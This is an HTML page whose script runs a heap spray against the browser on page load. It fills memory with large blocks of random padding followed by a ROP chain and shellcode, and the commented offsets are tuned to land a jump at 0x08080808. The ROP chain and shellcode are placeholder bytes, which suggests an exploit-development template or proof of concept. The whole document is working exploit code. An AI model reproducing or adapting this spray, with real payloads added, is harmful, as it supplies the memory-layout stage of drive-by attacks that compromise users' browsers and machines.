<html>
<head>
<script>

var sprayblocks = new Array();

function randomblock(blocksize)
{
	var theblock = "";
	for (var i = 0; i < blocksize; i++)
	{
		theblock += Math.floor(Math.random()*90)+10;
	}
	return theblock;
}

function tounescape(block)
{
	var blocklen = block.length;
	var unescapestr = "";
	for (var i = 0; i < blocklen-1; i=i+4)
	{
		unescapestr += "%u" + block.substring(i,i+4);
	}
	return unescapestr;
}

function allocateblocks()
{
	// define payload
	var ropchain = unescape("%u6161%u6161%u6262%u6262%u6363%u6363%u6464%u6464%u6565%u6565");
	var shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
	
	var beginning = unescape("TEST");
	
	for (i = 0; i < 0x500; i++) { 
		var junk_start = unescape(tounescape(randomblock(0x8)));	//8 bytes of random bytes is enough
		var junk_end = unescape(tounescape(randomblock(0x8)));	//8 bytes of random bytes is enough
		
		// create large chunk (it's stored in heap, but doesn't matter here). Length doesn't matter.
		while (beginning.length < 0x4000) beginning += junk_start;
		while (junk_end.length < 0x4000) junk_end += junk_end;
		
		// add the padding from block start to our payload (it has to be computed depending on where you jump) 
		offset = ((0x7E8 - 4) / 2); // correct offset. Jumping to 0x08080808
		var junk_front = beginning.substring(0, offset);
		
		// construct one block of 0x2000 bytes
		var junk_end = junk_end.substring(0, 0x2000 - junk_front.length - ropchain.length - shellcode.length)
		var smallblock = junk_front + ropchain + shellcode + junk_end;

		// repeat a few times 
		var largeblock = "";
		while (largeblock.length < 0x80000) { largeblock = largeblock + smallblock; }

		// allocate 0x500 times, chunks of 0xFE00 (VirtualMemoryThreshold) * 8 (8 bytes/1 block) = 0x7F000 -> 0x80000
		sprayblocks[i] = largeblock.substring(0, ((0x80000-6)/2)-8);	
	}
}
</script>
</head>

<body onload="allocateblocks()">
</body>
</html>
